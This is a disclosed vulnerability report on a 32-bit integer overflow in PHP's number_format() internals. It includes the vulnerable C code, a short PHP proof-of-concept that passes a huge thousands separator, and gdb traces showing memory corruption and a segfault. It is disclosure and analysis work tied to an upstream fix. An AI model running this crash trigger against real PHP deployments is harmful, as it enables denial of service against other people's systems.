# Memory corruption in _php_math_number_format_ex()

## Report Details
- **Report ID**: 180562
- **URL**: https://hackerone.com/reports/180562
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-11-07T01:47:13.948Z
- **Disclosed**: 2019-11-12T09:21:52.975Z

## Reporter
- **Username**: fosec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
The fix of this bug has been committed: https://bugs.php.net/bug.php?id=73336
Description:
--------------
I have found some vulnerable code at ```_php_math_number_format_ex()``` function. ```_php_math_number_format_ex()``` function is an internal function which is called from ```number_format()``` function. ```number_format()``` function takes in a string and uses it as the thousand separator. If the separator string is too long, it may lead to string overflow.

Inside the code of the function itself, there are checks in the *thousand_sep_len* to avoid string overflow:

``` c
PHPAPI zend_string *_php_math_number_format_ex(double d, int dec, char *dec_point,
		size_t dec_point_len, char *thousand_sep, size_t thousand_sep_len)
{
....
    /* allow for thousand separators */
	if (thousand_sep) {
		if (integral + thousand_sep_len * ((integral-1) / 3) < integral) {
			/* overflow */
			php_error_docref(NULL, E_ERROR, "String overflow");
		}
		integral += thousand_sep_len * ((integral-1) / 3);
	}

    reslen = integral;
....
}
```

The problem is that both *integral* variable and *thousand_sep_len* variable are unsigned integers, in 32 bits architectures this means 2^32 - 1 maximum value. So, if we set some appropriate values in *integral* and *thousand_sep_len*, for example: integral = 0x0a and thousand_sep_len = 0x65000000, ```integral + thousand_sep_len * ((integral-1) / 3)``` equals to 0x12F00000a, a result larger than the maximum representable value. In 32 bits architectures, the result will become 0x2F00000a and pass the check.


Test script:
----------------
``` php
<?php
ini_set('memory_limit', -1);
$thousands_sep = str_repeat("A", 0x65000000);
number_format(1234567890, 0, ".", $thousands_sep);
?>
```
Open php program in gdb, set a breakpoint at line *1149* in file ```ext/standard/math.c```

```
[----------------------------------registers-----------------------------------]
EAX: 0x2f00000a ('\n')
EBX: 0x52400010 ('A' <repeats 200 times>...)
ECX: 0xb7da8000 --> 0x1b8d9c
EDX: 0x2f000000 ('')
ESI: 0x65000000 ('A' <repeats 200 times>...)
EDI: 0xb7860188 --> 0x848b04e (<ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER>:      push   ebp)
EBP: 0xbfffbe88 --> 0xbfffbf28 --> 0xbfffbf68 --> 0xbfffbf88 --> 0xbfffbfc8 --> 0xbfffbff8 (--> ...)
ESP: 0xbfffbe30 --> 0x0
EIP: 0x834d202 (<_php_math_number_format_ex+316>:       cmp    eax,DWORD PTR [ebp-0x18])
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x834d1fd <_php_math_number_format_ex+311>:  mov    eax,DWORD PTR [ebp-0x18]
   0x834d200 <_php_math_number_format_ex+314>:  add    eax,edx
   0x834d202 <_php_math_number_format_ex+316>:  cmp    eax,DWORD PTR [ebp-0x18]
=> 0x834d205 <_php_math_number_format_ex+319>:  jae    0x834d223 <_php_math_number_format_ex+349>
 | 0x834d207 <_php_math_number_format_ex+321>:  mov    DWORD PTR [esp+0x8],0x89758e9
 | 0x834d20f <_php_math_number_format_ex+329>:  mov    DWORD PTR [esp+0x4],0x1
 | 0x834d217 <_php_math_number_format_ex+337>:  mov    DWORD PTR [esp],0x0
 | 0x834d21e <_php_math_number_format_ex+344>:  call   0x83c1a10 <php_error_docref0>
 |->   0x834d223 <_php_math_number_format_ex+349>:      mov    eax,DWORD PTR [ebp-0x18]
       0x834d226 <_php_math_number_format_ex+352>:      sub    eax,0x1
       0x834d229 <_php_math_number_format_ex+355>:      mov    edx,0xaaaaaaab
       0x834d22e <_php_math_number_format_ex+360>:      mul    edx
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xbfffbe30 --> 0x0
0004| 0xbfffbe34 --> 0x89758e1 ("%.*F")
0008| 0xbfffbe38 --> 0x0
0012| 0xbfffbe3c --> 0xb4800000 ('A' <repeats 200 times>...)
0016| 0xbfffbe40 --> 0x41d26580
0020| 0xbfffbe44 --> 0x65000014 ('A' <repeats 200 times>...)
0024| 0xbfffbe48 --> 0xb4800000 ('A' <repeats 200 times>...)
0028| 0xbfffbe4c --> 0x41d26580
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0834d202      1150                    if (integral + thousand_sep_len * ((integral-1) / 3) < integral) {
gdb-peda$
```

```DWORD PTR [ebp-0x18]``` is *integral* variable and EAX register will hold result of ```integral + thousand_sep_len * ((integral-1) / 3)``` . Because *integral* is lower than 0x2f00000a, *integral* will be updated with 0x2f00000a. *reslen* will be 0x2f00000a. 

*reslen* is used as a parameter in ```zend_string_alloc()``` to create a new zend_string object holding formatted string ( reffer at ```ext/standard/math.c:1175``` ):
``` c
	res = zend_string_alloc(reslen, 0);
```

Two local variables *s* and *t* are used during format process. They are used to copy numbers to formatted string and add thousand separator every three digits ( reffer at ```ext/standard/math.c:1209``` ):
```c
/* copy the numbers before the decimal point, adding thousand
	 * separator every three digits */
	while (s >= ZSTR_VAL(tmpbuf)) {
		*t-- = *s--;
		if (thousand_sep && (++count%3)==0 && s >= ZSTR_VAL(tmpbuf)) {
			t -= thousand_sep_len;
			memcpy(t + 1, thousand_sep, thousand_sep_len);
		}
}
```

Because *thousand_sep_len* is too big,  the result of ```t -= thousand_sep_len;``` is unexpected value.
In this example, ```$ebp-0x10``` points to *t*.

Before
```
 [----------------------------------registers-----------------------------------]
EAX: 0x9b000000 ('A' <repeats 200 times>...)
EBX: 0x52400010 ('A' <repeats 200 times>...)
EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x834d3d9 <_php_math_number_format_ex+787>:  ja     0x834d3ff <_php_math_number_format_ex+825>
   0x834d3db <_php_math_number_format_ex+789>:  mov    eax,DWORD PTR [ebp+0x20]
   0x834d3de <_php_math_number_format_ex+792>:  neg    eax
=> 0x834d3e0 <_php_math_number_format_ex+794>:  add    DWORD PTR [ebp-0x10],eax
   0x834d3e3 <_php_math_number_format_ex+797>:  mov    eax,DWORD PTR [ebp-0x10]
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0834d3e0      1213                            t -= thousand_sep_len;
gdb-peda$ x/1xw $ebp-0x10
0xbfffbe78:     0x52200016
```
After:
```
 [----------------------------------registers-----------------------------------]
EAX: 0x9b000000 ('A' <repeats 200 times>...)
EBX: 0x52400010 ('A' <repeats 200 times>...)
[-------------------------------------code-------------------------------------]
   0x834d3db <_php_math_number_format_ex+789>:  mov    eax,DWORD PTR [ebp+0x20]
   0x834d3de <_php_math_number_format_ex+792>:  neg    eax
   0x834d3e0 <_php_math_number_format_ex+794>:  add    DWORD PTR [ebp-0x10],eax
=> 0x834d3e3 <_php_math_number_format_ex+797>:  mov    eax,DWORD PTR [ebp-0x10]
   0x834d3e6 <_php_math_number_format_ex+800>:  lea    edx,[eax+0x1]
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, _php_math_number_format_ex (d=1234567890, dec=0x0, dec_point=0xb78012b8 ".",
    dec_point_len=0x1, thousand_sep=0x52400010 'A' <repeats 200 times>...,
    thousand_sep_len=0x65000000) at /root/fuzzer/php7/ext/standard/math.c:1214
1214                            memcpy(t + 1, thousand_sep, thousand_sep_len);
gdb-peda$ x/1xw $ebp-0x10
0xbfffbe78:     0xed200016
```

0xed200016 is an unusable memory address. 

```_php_math_number_format_ex``` function tries to copy thousand separator into formatted string, leads to memory corruption ( reffer at ```ext/standard/math.c:1214``` ):
``` c
memcpy(t + 1, thousand_sep, thousand_sep_len);
```

```
 [----------------------------------registers-----------------------------------]
EAX: 0x52400010 ('A' <repeats 200 times>...)
EBX: 0x52400010 ('A' <repeats 200 times>...)
ECX: 0x0
EDX: 0xed200017
ESI: 0x65000000 ('A' <repeats 200 times>...)
EDI: 0xb7860188 --> 0x848b04e (<ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER>:      push   ebp)
EBP: 0xbfffbe88 --> 0xbfffbf28 --> 0xbfffbf68 --> 0xbfffbf88 --> 0xbfffbfc8 --> 0xbfffbff8 (--> ...)
ESP: 0xbfffbe30 --> 0xed200017
EIP: 0x834d3fa (<_php_math_number_format_ex+820>:       call   0x80647f0 <memcpy@plt>)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x834d3f0 <_php_math_number_format_ex+810>:  mov    eax,DWORD PTR [ebp+0x1c]
   0x834d3f3 <_php_math_number_format_ex+813>:  mov    DWORD PTR [esp+0x4],eax
   0x834d3f7 <_php_math_number_format_ex+817>:  mov    DWORD PTR [esp],edx
=> 0x834d3fa <_php_math_number_format_ex+820>:  call   0x80647f0 <memcpy@plt>
   0x834d3ff <_php_math_number_format_ex+825>:  mov    eax,DWORD PTR [ebp-0x2c]
   0x834d402 <_php_math_number_format_ex+828>:  add    eax,0x10
   0x834d405 <_php_math_number_format_ex+831>:  cmp    eax,DWORD PTR [ebp-0xc]
   0x834d408 <_php_math_number_format_ex+834>:  jbe    0x834d38e <_php_math_number_format_ex+712>
Guessed arguments:
arg[0]: 0xed200017
arg[1]: 0x52400010 ('A' <repeats 200 times>...)
arg[2]: 0x65000000 ('A' <repeats 200 times>...)
[------------------------------------stack-------------------------------------]
0000| 0xbfffbe30 --> 0xed200017
0004| 0xbfffbe34 --> 0x52400010 ('A' <repeats 200 times>...)
0008| 0xbfffbe38 --> 0x65000000 ('A' <repeats 200 times>...)
0012| 0xbfffbe3c --> 0xb4800000 ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0834d3fa      1214                            memcpy(t + 1, thousand_sep, thousand_sep_len);
gdb-peda$
```

Expected result:
----------------
No SIGSEGV

Actual result:
--------------
SIGSEGV

## Attachments
No attachments
